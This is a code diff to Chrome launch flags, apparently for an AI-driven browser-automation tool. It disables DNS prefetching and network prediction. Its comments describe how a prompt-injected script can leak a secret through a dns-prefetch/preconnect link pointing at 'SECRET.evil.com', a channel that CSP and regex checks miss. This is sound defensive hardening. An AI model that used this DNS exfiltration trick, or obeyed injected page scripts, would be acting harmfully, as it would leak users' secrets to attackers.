@@ -54,6 +54,14 @@ export const STEALTH_ARGS = [
   "--hide-crash-restore-bubble",
   "--password-store=basic",
   "--disable-infobars",
+  // Kill DNS prefetching. A prompt-injected script can leak a secret through a
+  // `<link rel=dns-prefetch|preconnect href=https://SECRET.evil.com>` hint — the
+  // resolver emits a DNS query for SECRET.evil.com with no HTTP request and no
+  // resource fetch, so CSP (which only gates fetches) can't cover it and no
+  // evaluate regex reliably catches every injection form. This standalone switch
+  // makes the hint inert at the network layer. Paired with NetworkPrediction in
+  // DISABLE_FEATURES below (preconnect/prefetch/prerender predictors).
+  "--dns-prefetch-disable",
 ];
 
 /**
@@ -62,7 +70,14 @@ export const STEALTH_ARGS = [
  * and be passed as a single consolidated flag. RendererCodeIntegrity is
  * intentionally absent — disabling it weakens renderer code integrity.
  */
-export const DISABLE_FEATURES = ["Translate", "MediaRouter", "DownloadBubble", "DownloadBubbleV2"] as const;
+// NetworkPrediction closes the same dns-prefetch/preconnect DNS-label exfil
+// channel as --dns-prefetch-disable above, but at the predictor layer: it
+// disables Chrome's network-prediction service that acts on preconnect/prefetch/
+// prerender hints (the LoadingPredictor). CSP can't cover these — there is no
+// fetch to gate — and no evaluate regex catches every injection form, so this is
+// the class fix. Lives here (not a second --disable-features flag) because Chrome
+// honors only the LAST --disable-features occurrence.
+export const DISABLE_FEATURES = ["Translate", "MediaRouter", "DownloadBubble", "DownloadBubbleV2", "NetworkPrediction"] as const;
 
 export function findChromeExecutable(): string | null {
   const candidates = process.platform === "win32"
